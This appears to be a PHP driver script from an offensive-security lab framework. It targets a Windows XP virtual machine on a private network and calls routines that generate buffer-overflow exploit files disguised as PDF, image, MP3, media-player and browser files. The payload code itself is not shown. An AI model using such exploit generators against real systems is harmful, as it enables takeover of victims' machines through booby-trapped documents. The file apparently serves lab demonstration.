<?php


class poc4net extends DATA{
    
    
    public function __construct() {
        parent::__construct();
        
    }
  
    
    public function poc4malware4backdoor4exploit(){
        $this->gtitre("Failles Applicatives - BufferOverflow");
        $target_vmx_name = "xp3" ;
        $target_ip = "10.60.10.129"; // xp3
        $target_port = 8080 ;
        $attacker_ip = "10.60.10.1";
        $attacker_port = $this->proxy_port_burp;
        $file_path_output = "test";
        $snapshot = "test";
        $malware = new malware4win($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
        $malware->question("est il possible de prendre le controle d'une machine a partir d'une image , d'un pdf ou d'un fichier MP3 ?");
        $malware->bof2exp4app4local2pdf("$this->dir_tmp/poc_doc.pdf");$this->pause();
        $malware->bof2exp4app4local2vlc("$this->dir_tmp/poc_vlc.s3m");$this->pause();
        $malware->bof2exp4app4local2img("$this->dir_tmp/poc_img.bmp");$this->pause();
        $malware->bof2exp4app4local2mp3("$this->dir_tmp/poc_music.lst");$this->pause();
        $malware->bof2exp4app4local2realplayer("$this->dir_tmp/poc_realplayer.rm");$this->pause();
        $malware->bof2exp4app4local2firefox("poc_firefox.html");$this->pause(); // OK
        $malware->bof2exp4app4local2quicktime("poc_quicktime.html");$this->pause(); // OK
        $malware->bof2exp4app4local2flash("poc_flash.html");$this->pause();
    }
    


}
?>